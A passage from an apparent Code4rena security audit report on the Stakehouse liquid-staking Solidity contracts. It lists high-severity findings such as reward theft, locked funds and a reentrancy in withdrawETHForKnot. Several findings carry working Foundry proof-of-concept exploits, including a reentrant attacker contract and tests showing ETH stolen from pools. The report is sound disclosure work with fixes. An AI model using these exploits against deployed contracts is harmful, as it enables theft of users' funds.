[nogo](https://twitter.com/0xnogo)\n  72. [oyc\\_109](https://twitter.com/andyfeili)\n  73. pashov\n  74. [pavankv](https://twitter.com/@PavanKumarKv2)\n  75. peanuts\n  76. pedr02b2\n  77. perseverancesuccess\n  78. rbserver\n  79. ronnyx2017\n  80. rotcivegaf\n  81. sahar\n  82. sakman\n  83. satoshipotato\n  84. shark\n  85. skyle\n  86. tnevler\n  87. trustindistrust\n  88. unforgiven\n  89. wait\n  90. yixxas\n  91. zaskoh\n  92. zgo\n\nThis contest was judged by [LSDan](https://twitter.com/lsdan_defi).\n\nFinal report assembled by [liveactionllama](https://twitter.com/liveactionllama) and [CloudEllie](https://twitter.com/CloudEllie1).\n\n# Summary\n\nThe C4 analysis yielded an aggregated total of 52 unique vulnerabilities. Of these vulnerabilities, 21 received a risk rating in the category of HIGH severity and 31 received a risk rating in the category of MEDIUM severity.\n\nAdditionally, C4 analysis included 60 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 18 reports recommending gas optimizations.\n\nAll of the issues presented here are linked back to their original finding.\n\n# Scope\n\nThe code under review can be found within the [C4 LSD Network - Stakehouse contest repository](https://github.com/code-423n4/2022-11-stakehouse), and is composed of 21 smart contracts written in the Solidity programming language and includes 2,269 lines of Solidity code.\n\n# Severity Criteria\n\nC4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).\n\nVulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.\n\nHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\n\n- Malicious Input Handling\n- Escalation of privileges\n- Arithmetic\n- Gas use\n\nFurther information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com).\n\n# High Risk Findings (21)\n## [[H-01] Any user being the first to claim rewards from `GiantMevAndFeesPool` can unexepectedly collect them all](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/32)\n*Submitted by [clems4ever](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/32)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L85><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L203><br>\n\nAny user being the first to claim rewards from GiantMevAndFeesPool, can get all the previously generated rewards whatever the amount and even if he did not participate to generate those rewards...\n\n### Proof of Concept\n\n<https://gist.github.com/clems4ever/c9fe06ce454ff6c4124f4bd29d3598de>\n\nCopy paste it in the test suite and run it.\n\n### Tools Used\n\nforge test\n\n### Recommended Mitigation Steps\n\nRework the way `accumulatedETHPerLPShare` and `claimed` is used. There are multiple bugs due to the interaction between those variables as you will see in my other reports.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/32)**\n\n\n\n***\n\n## [[H-02] Rewards of `GiantMevAndFeesPool` can be locked for all users](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/33)\n*Submitted by [clems4ever](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/33)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L172><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L8><br>\n\nAny malicious user could make the rewards in GiantMevAndFeesPool inaccessible to all other users...\n\n### Proof of Concept\n\n<https://gist.github.com/clems4ever/9b05391cc2192c1b6e8178faa38dfe41>\n\nCopy the file in the test suite and run the test.\n\n### Tools Used\n\nforge test\n\n### Recommended Mitigation Steps\n\nProtect the inherited functions of the ERC20 tokens (GiantLP and LPToken) because `transfer` is not protected and can trigger the `before` and `after` hooks. There is the same issue with LPToken and StakingFundsVault.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/33)**\n\n\n\n***\n\n## [[H-03] Theft of ETH of free floating SLOT holders](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/40)\n*Submitted by [clems4ever](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/40), also found by [HE1M](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/86)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L369><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L668><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L228><br>\n\nA malicious user can steal all claimable ETH belonging to free floating SLOT holders...\n\n### Proof of Concept\n\n<https://gist.github.com/clems4ever/f1149743897b2620eab0734f88208603>\n\nRun it in the test suite with forge\n\n### Tools Used\n\nManual review / forge\n\n### Recommended Mitigation Steps\n\n`+=` operator instead of `=` in <https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L228> ?\n\nThe logic for keeping the rewards up-to-date is also quite complex in my opinion. The main thing that triggered it for me was the lazy call to `updateAccruedETHPerShares`. Why not keep the state updated after each operation instead?\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/40)**\n\n\n\n***\n\n## [[H-04] Unstaking does not update the mapping `sETHUserClaimForKnot`](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/90)\n*Submitted by [HE1M](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/90), also found by [9svR6w](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/180)*\n\nIf a user stakes some sETH, and after some time decides to unstake some amount of sETH, later s/he will not be qualified or be less qualified to claim ETH on the remaining staked sETH.\n\n### Proof of Concept\n\nSuppose Alice stakes 5 sETH by calling `stake(...)`.<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L203><br>\nSo, we will have:\n\n*   `sETHUserClaimForKnot[BLS][Alice] = (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION`\n*   `sETHStakedBalanceForKnot[BLS][Alice] = 5 * 10^18`\n*   `sETHTotalStakeForKnot[BLS] += 5 * 10^18`\n\nLater, Alice decides to unstake 3 sETH by calling `unstake(...)`.<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L245>\n\nSo, all ETH owed to Alice will be paid:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L257>\n\nThen, we will have:\n\n*   `sETHUserClaimForKnot[BLS][Alice] = (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION`\n*   `sETHStakedBalanceForKnot[BLS][Alice] = 2 * 10^18`\n*   `sETHTotalStakeForKnot[BLS] -= 3 * 10^18`\n\nIt is clear that the mapping `sETHStakedBalanceForKnot` is decreased as expected, but the mapping `sETHUserClaimForKnot` is not changed. In other words, the mapping `sETHUserClaimForKnot` is still holding the claimed amount based on the time 5 sETH were staked.\n\nIf, after some time, the ETH is accumulated per free floating share for the BLS public key that Alice was staking for, Alice will be qualified to some more ETH to claim (because she has still 2 sETH staked).\n\nIf Alice unstakes by calling `unstake(...)` or claim ETH by calling `claimAsStaker(...)`, in both calls, the function `calculateUnclaimedFreeFloatingETHShare` will be called to calculate the amount of unclaimed ETH:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L652>\n\nIn this function, we will have:\n\n*   `stakedBal = sETHStakedBalanceForKnot[BLS][Alice]` = 2 &ast; 10^18\n*   `userShare = (newAccumulatedETHPerShare * stakedBal) / PRECISION`\n\nThe return value which is unclaimed ETH will be:\n\n    userShare - sETHUserClaimForKnot[BLS][Alice] = \n    (newAccumulatedETHPerShare * 2 * 10^18) / PRECISION - (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION\n\nThis return value is not correct (it is highly possible to be smaller than 0, and as a result Alice can not claim anything), because the claimed ETH is still based on the time when 5 sETH were staked, not on the time when 2 sETH were remaining/staked.\n\nThe vulnerability is that during unstaking, the mapping `sETHUserClaimForKnot` is not updated to the correct value. In other words, this mapping is updated in `_claimAsStaker`, but it is updated based on 5 sETH staked, later when 3 sETH are unstaked, this mapping should be again updated based on the remaing sETH (which is 2 sETH).\n\nAs a result, Alice can not claim ETH or she will qualify for less amount.\n\n### Recommended Mitigation Steps\n\nThe following line should be added on line 274:\n\n    sETHUserClaimForKnot[_blsPubKey][msg.sender] =\n                    (accumulatedETHPerShare * sETHStakedBalanceForKnot[_blsPubKey][msg.sender]) / PRECISION\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L274>\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/90)**\n\n\n\n***\n\n## [[H-05] Reentrancy in `LiquidStakingManager.sol#withdrawETHForKnow` leads to loss of fund from smart wallet](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/110)\n*Submitted by [ladboy233](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/110), also found by [Trust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/402), [btk](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/330), [0xbepresent](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/288), [bitbopper](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/222), and [yixxas](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/181)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L435><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L340><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L347><br>\n\nThe code below violates the check effect pattern, the code banned the public key to mark the public key invalid to not let the msg.sender withdraw again after sending the ETH.\n\n```solidity\n    /// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked.\n    /// @dev A banned node runner cannot withdraw ETH for the KNOT. \n    /// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawn\n    function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {\n        require(_recipient != address(0), \"Zero address\");\n        require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key has already withdrawn or not a part of LSD network\");\n\n        address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];\n        require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, \"Not the node runner for the smart wallet \");\n        require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, \"Node runner is banned from LSD network\");\n        require(associatedSmartWallet.balance >= 4 ether, \"Insufficient balance\");\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Initials not registered\"\n        );\n\n        // refund 4 ether from smart wallet to node runner's EOA\n        IOwnableSmartWallet(associatedSmartWallet).rawExecute(\n            _recipient,\n            \"\",\n            4 ether\n        );\n\n        // update the mapping\n        bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n\n        emit ETHWithdrawnFromSmartWallet(associatedSmartWallet, _blsPublicKeyOfKnot, msg.sender);\n    }\n```\n\nNote the section:\n\n```solidity\n// refund 4 ether from smart wallet to node runner's EOA\nIOwnableSmartWallet(associatedSmartWallet).rawExecute(\n\t_recipient,\n\t\"\",\n\t4 ether\n);\n\n// update the mapping\nbannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n```\n\nIf the \\_recipient is a smart contract, it can re-enter the withdraw function to withdraw another 4 ETH multiple times before the public key is banned.\n\nAs shown in our running POC.\n\nWe need to add the import first:\n\n```solidity\nimport { MockAccountManager } from \"../../contracts/testing/stakehouse/MockAccountManager.sol\";\n```\n\nWe can add the smart contract below:\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12>\n\n```solidity\ninterface IManager {\n    function registerBLSPublicKeys(\n        bytes[] calldata _blsPublicKeys,\n        bytes[] calldata _blsSignatures,\n        address _eoaRepresentative\n    ) external payable;\n    function withdrawETHForKnot(\n        address _recipient, \n        bytes calldata _blsPublicKeyOfKnot\n    ) external;\n}\n\ncontract NonEOARepresentative {\n\n    address manager;\n    bool state;\n\n    constructor(address _manager) payable {\n\n        bytes[] memory publicKeys = new bytes[](2);\n        publicKeys[0] = \"publicKeys1\";\n        publicKeys[1] = \"publicKeys2\";\n\n        bytes[] memory signature = new bytes[](2);\n        signature[0] = \"signature1\";\n        signature[1] = \"signature2\";\n\n        IManager(_manager).registerBLSPublicKeys{value: 8 ether}(\n            publicKeys,\n            signature,\n            address(this)\n        );\n\n        manager = _manager;\n\n    }\n\n    function withdraw(bytes calldata _blsPublicKeyOfKnot) external {\n        IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);\n    }\n\n    receive() external payable {\n        if(!state) {\n            state = true;\n            this.withdraw(\"publicKeys1\");\n        }\n    }\n\n}\n```\n\nThere is a restriction in this reentrancy attack, the msg.sender needs to be the same recipient when calling `withdrawETHForKnot`.\n\nWe add the test case.\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35>\n\n```solidity\nfunction testBypassIsContractCheck_POC() public {\n\n\tNonEOARepresentative pass = new NonEOARepresentative{value: 8 ether}(address(manager));\n\taddress wallet = manager.smartWalletOfNodeRunner(address(pass));\n\taddress reprenstative = manager.smartWalletRepresentative(wallet);\n\tconsole.log(\"smart contract registered as a EOA representative\");\n\tconsole.log(address(reprenstative) == address(pass));\n\n\t// to set the public key state to IDataStructures.LifecycleStatus.INITIALS_REGISTERED\n\tMockAccountManager(factory.accountMan()).setLifecycleStatus(\"publicKeys1\", 1);\n\n\t// expected to withdraw 4 ETHER, but reentrancy allows withdrawing 8 ETHER\n\tpass.withdraw(\"publicKeys1\");\n\tconsole.log(\"balance after the withdraw, expected 4 ETH, but has 8 ETH\");\n\tconsole.log(address(pass).balance);\n\n}\n```\n\nWe run the test:\n\n```solidity\nforge test -vv --match testWithdraw_Reentrancy_POC\n```\n\nAnd the result is\n\n```solidity\nRunning 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests\n[PASS] testWithdraw_Reentrancy_POC() (gas: 578021)\nLogs:\n  smart contract registered as a EOA representative\n  true\n  balance after the withdraw, expected 4 ETH, but has 8 ETH\n  8000000000000000000\n\nTest result: ok. 1 passed; 0 failed; finished in 14.85ms\n```\n\nThe function call is\n\n`pass.withdraw(\"publicKeys1\")`, which calls\n\n```solidity\nfunction withdraw(bytes calldata _blsPublicKeyOfKnot) external {\n\tIManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);\n}\n```\n\nWhich trigger:\n\n```solidity\n// refund 4 ether from smart wallet to node runner's EOA\nIOwnableSmartWallet(associatedSmartWallet).rawExecute(\n\t_recipient,\n\t\"\",\n\t4 ether\n);\n```\n\nWhich triggers reentrancy to withdraw the fund again before the public key is banned.\n\n```solidity\nreceive() external payable {\n\tif(!state) {\n\t\tstate = true;\n\t\tthis.withdraw(\"publicKeys1\");\n\t}\n}\n```\n\n### Recommended Mitigation Steps\n\nWe recommend ban the public key first then send the fund out, and use openzeppelin nonReentrant modifier to avoid reentrancy.\n\n```solidity\n\n// update the mapping\nbannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n\n// refund 4 ether from smart wallet to node runner's EOA\nIOwnableSmartWallet(associatedSmartWallet).rawExecute(\n\t_recipient,\n\t\"\",\n\t4 ether\n);\n```\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/110)**\n\n\n\n***\n\n## [[H-06] `BringUnusedETHBackIntoGiantPool` can cause stuck ether funds in Giant Pool](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/115)\n*Submitted by [koxuan](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/115), also found by [hihen](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/194)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137-L158><br>\n\n`withdrawUnusedETHToGiantPool` will withdraw any eth from the vault if staking has not commenced(knot status is `INITIALS_REGISTERED`), the eth will be drawn successful to the giant pool. However, idleETH variable is not updated. idleETH  is the available ETH for withdrawing and depositing eth for staking. Since there is no other places that updates idleETH other than depositing eth for staking and withdrawing eth, the eth withdrawn from the vault will be stuck forever.\n\n### Proof of Concept\n\nPlace poc in GiantPools.t.sol with `import { MockStakingFundsVault } from \"../../contracts/testing/liquid-staking/MockStakingFundsVault.sol\";`\n\n```solidity\n    function testStuckFundsInGiantMEV() public {\n\n        stakingFundsVault = MockStakingFundsVault(payable(manager.stakingFundsVault()));\n        address nodeRunner = accountOne; vm.deal(nodeRunner, 4 ether);\n        //address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);\n        //address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n        address victim = accountFour; vm.deal(victim, 1 ether);\n\n\n        registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);\n\n        emit log_address(address(giantFeesAndMevPool));\n        vm.startPrank(victim);\n\n        emit log_uint(victim.balance);\n        giantFeesAndMevPool.depositETH{value: 1 ether}(1 ether);\n        bytes[][] memory blsKeysForVaults = new bytes[][](1);\n        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);\n\n        uint256[][] memory stakeAmountsForVaults = new uint256[][](1);\n        stakeAmountsForVaults[0] = getUint256ArrayFromValues(1 ether);\n        giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(stakingFundsVault)),getUint256ArrayFromValues(1 ether) , blsKeysForVaults, stakeAmountsForVaults);\n\n        emit log_uint(victim.balance);\n\n\n        vm.warp(block.timestamp + 60 minutes);\n        LPToken lp = (stakingFundsVault.lpTokenForKnot(blsKeysForVaults[0][0]));\n        LPToken [][] memory lpToken = new LPToken[][](1);\n        LPToken[] memory temp  = new LPToken[](1);\n        temp[0] = lp;\n        lpToken[0] = temp;\n\n        emit log_uint(address(giantFeesAndMevPool).balance);\n        giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(getAddressArrayFromValues(address(stakingFundsVault)),lpToken, stakeAmountsForVaults);\n\n        emit log_uint(address(giantFeesAndMevPool).balance);\n        vm.expectRevert();\n        giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(stakingFundsVault)),getUint256ArrayFromValues(1 ether) , blsKeysForVaults, stakeAmountsForVaults);\n\n        vm.expectRevert();\n        giantSavETHPool.withdrawETH(1 ether);\n\n        vm.stopPrank();\n    }\n\n\n```\n\nBoth withdrawing eth for user and depositing eth to stake fails and reverts as shown in the poc due to underflow in idleETH.\n\nNote that the same problem also exists in GiantSavETHVaultPool, however a poc cannot be done for it as another bug exist in GiantSavETHVaultPool which prevents it from receiving funds as it lacks a receive() or fallback() implementation.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nUpdate `idleETH` in withdrawUnusedETHToGiantPool\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/115)**\n\n\n\n***\n\n## [[H-07] GiantLP with a `transferHookProcessor` cant be burned, users' funds will be stuck in the Giant Pool](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/116)\n*Submitted by [ronnyx2017](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/116), also found by [Trust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/404), [rotcivegaf](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/191), [9svR6w](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/182), [Lambda](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/142), and [HE1M](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/60)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantLP.sol#L39-L47><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L73-L78><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L57><br>\n\nThe GiantLP with a transferHookProcessor will call `transferHookProcessor.beforeTokenTransfer(_from, _to, _amount)` when it's transferred / minted / burned.\n\nBut the `to` address is address(0x00) in the erc20 `_burn` function. The GiantMevAndFeesPool.beforeTokenTransfer will call the function `SyndicateRewardsProcessor._distributeETHRewardsToUserForToken` will a zero address check in the first line:\n\n    function _distributeETHRewardsToUserForToken(...) internal {\n        require(_recipient != address(0), \"Zero address\");\n\nSo any withdraw function with a operation of burning the GiantLP token with a transferHookProcessor will revert because of the zero address check. The users' funds will be stuck in the Giant Pool contracts.\n\n### Proof of Concept\n\nI wrote a test about `GiantMevAndFeesPool.withdrawETH` function which is used to withdraw eth from the Giant Pool. It will be reverted.\n\ntest/foundry/LpBurn.t.sol\n\n    pragma solidity ^0.8.13;\n\n    // SPDX-License-Identifier: MIT\n    import {GiantPoolTests} from \"./GiantPools.t.sol\";\n\n    contract LpBurnTests is GiantPoolTests {\n        function testburn() public{\n            address feesAndMevUserOne = accountOne; vm.deal(feesAndMevUserOne, 4 ether);\n            vm.startPrank(feesAndMevUserOne);\n            giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);\n            giantFeesAndMevPool.withdrawETH(4 ether);\n            vm.stopPrank();\n        }\n    }\n\nrun test\n\n    forge test --match-test testburn -vvv\n\ntest log:\n\n    ...\n    ...\n        ├─ [115584] GiantMevAndFeesPool::withdrawETH(4000000000000000000) \n        │   ├─ [585] GiantLP::balanceOf(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266) [staticcall]\n        │   │   └─ ← 4000000000000000000\n        │   ├─ [128081] GiantLP::burn(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 4000000000000000000) \n        │   │   ├─ [126775] GiantMevAndFeesPool::beforeTokenTransfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 0x0000000000000000000000000000000000000000, 4000000000000000000) \n        │   │   │   ├─ [371] GiantLP::totalSupply() [staticcall]\n        │   │   │   │   └─ ← 4000000000000000000\n        │   │   │   ├─ emit ETHReceived(amount: 4000000000000000000)\n        │   │   │   ├─ [585] GiantLP::balanceOf(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266) [staticcall]\n        │   │   │   │   └─ ← 4000000000000000000\n        │   │   │   ├─ [0] 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266::fallback{value: 4000000000000000000}() \n        │   │   │   │   └─ ← ()\n        │   │   │   ├─ emit ETHDistributed(user: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, recipient: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, amount: 4000000000000000000)\n        │   │   │   ├─ [2585] GiantLP::balanceOf(0x0000000000000000000000000000000000000000) [staticcall]\n        │   │   │   │   └─ ← 0\n        │   │   │   └─ ← \"Zero address\"\n        │   │   └─ ← \"Zero address\"\n        │   └─ ← \"Zero address\"\n        └─ ← \"Zero address\"\n\n### Tools Used\n\nfoundry\n\n### Recommended Mitigation Steps\n\nSkip update rewards for zero address.\n\n**[vince0656 (Stakehouse) confirmed duplicate issue #60](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/60#event-7905446439)**\n\n\n\n***\n\n## [[H-08] function `withdrawETH` from `GiantMevAndFeesPool` can steal most of eth because of idleETH is reduced before burning token](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/129)\n*Submitted by [ronnyx2017](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/129), also found by [cccz](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/239)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantPoolBase.sol#L57-L60><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L76-L90><br>\n\nThe contract GiantMevAndFeesPool override the function totalRewardsReceived:\n\n    return address(this).balance + totalClaimed - idleETH;\n\nThe function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the function `SyndicateRewardsProcessor._updateAccumulatedETHPerLP`\n\n    uint256 received = totalRewardsReceived();\n    uint256 unprocessed = received - totalETHSeen;\n\nBut it will decrease the `idleETH` first and then burn the lpTokenETH in the function `GiantMevAndFeesPool.withdrawETH`. The lpTokenETH burn option will trigger `GiantMevAndFeesPool.beforeTokenTransfer` which will call \\_updateAccumulatedETHPerLP and send the accumulated rewards to the msg sender. Because of the diminution of the idleETH, the `accumulatedETHPerLPShare` is added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.\n\n### Proof of Concept\n\nI wrote a test file for proof, but there is another bug/vulnerability which will make the `GiantMevAndFeesPool.withdrawETH` function break down. I submitted it as the other finding named \"GiantLP with a transferHookProcessor cant be burned, users' funds will be stuck in the Giant Pool\". You should fix it first by modifying the code <https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L161-L166> to :\n\n    if (_to != address(0)) {\n        _distributeETHRewardsToUserForToken(\n            _to,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(_to),\n            _to\n        );\n    }\n\nI know modifying the project source code is controversial. Please believe me it's a bug needed to be fixed and it's independent of the current vulnerability.\n\ntest:<br>\ntest/foundry/TakeFromGiantPools2.t.sol\n\n    pragma solidity ^0.8.13;\n\n    // SPDX-License-Identifier: MIT\n\n    import \"forge-std/console.sol\";\n    import {GiantPoolTests} from \"./GiantPools.t.sol\";\n\n    contract TakeFromGiantPools2 is GiantPoolTests {\n        function testDWUpdateRate2() public{\n            address feesAndMevUserOne = accountOne; vm.deal(feesAndMevUserOne, 4 ether);\n            address feesAndMevUserTwo = accountTwo; vm.deal(feesAndMevUserTwo, 4 ether);\n            // Deposit ETH into giant fees and mev\n            vm.startPrank(feesAndMevUserOne);\n            giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);\n            vm.stopPrank();\n            vm.startPrank(feesAndMevUserTwo);\n            giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);\n            giantFeesAndMevPool.withdrawETH(4 ether);\n            vm.stopPrank();\n            console.log(\"user one:\", getBalance(feesAndMevUserOne));\n            console.log(\"user two(attacker):\", getBalance(feesAndMevUserTwo));\n            console.log(\"giantFeesAndMevPool:\", getBalance(address(giantFeesAndMevPool)));\n        }\n\n        function getBalance(address addr) internal returns (uint){\n            // just ETH\n            return addr.balance;  // + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);\n        }\n\n    }\n\nrun test:\n\n    forge test --match-test testDWUpdateRate2 -vvv\n\ntest log:\n\n    Logs:\n      user one: 0\n      user two(attacker): 6000000000000000000\n      giantFeesAndMevPool: 2000000000000000000\n\nThe attacker stole 2 eth from the pool.\n\n### Tools Used\n\nfoundry\n\n### Recommended Mitigation Steps\n\n`idleETH -= _amount;` should be after the `lpTokenETH.burn`.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/129)**\n\n\n\n***\n\n## [[H-09] Incorrect accounting in `SyndicateRewardsProcessor` results in any LP token holder being able to steal other LP tokens holder's ETH from the fees and MEV vault](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/147)\n*Submitted by [c7e7eff](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/147), also found by [Trust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/425), [0x4non](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/348), [arcoun](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/300), [Jeiwan](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/256), [unforgiven](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/237), 